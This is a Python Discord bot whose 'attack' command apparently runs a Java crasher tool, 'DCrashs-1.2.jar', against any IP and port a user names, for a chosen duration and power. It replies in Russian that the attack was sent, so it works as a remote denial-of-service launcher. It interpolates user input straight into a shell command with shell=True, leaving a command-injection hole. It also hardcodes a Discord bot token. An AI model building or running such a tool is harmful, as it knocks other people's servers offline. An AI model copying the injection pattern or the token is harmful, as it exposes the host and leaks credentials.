import discord
import subprocess as process
from discord.ext import commands

bot = commands.Bot(command_prefix="", help_command=None)
TOKEN = 'OTQwNjIzNDY4MjYzNzcyMTYw.YgKF3g.J0Ldj8WzBTEJO6EVXQsLGjFDzps'
JAR = 'DCrashs-1.2.jar'
ROLE_ID = 952609821620834344

@commands.has_role(ROLE_ID)
@bot.command(pass_content=True)
async def attack(ctx, ip, port, protocol, time, power):
	if ctx.channel.id == 952196103762214945:
		attack = True
		if attack:
			if int(time) < 1201:
				process.Popen(f"java -jar {JAR} -host {ip} -port {port} -protocol {protocol} -duration {time} -power {power}", shell=True)
				embed=discord.Embed(title="", description=f"Атака отправлена!\nIP\n{ip}\nPORT\n{port}\nPROTOCOL\n{protocol}\nTIME\n{time}\nPOWER\n{power}")
				await ctx.send(embed=embed)
	else:
		pass
@bot.command()
async def help(ctx):
	embed=discord.Embed(title="HELP", description=f"attack <IP> <PORT> <PROTOCOL> <TIME> <POWER (-1 for maximum)>")
	await ctx.send(embed=embed)
bot.run(TOKEN)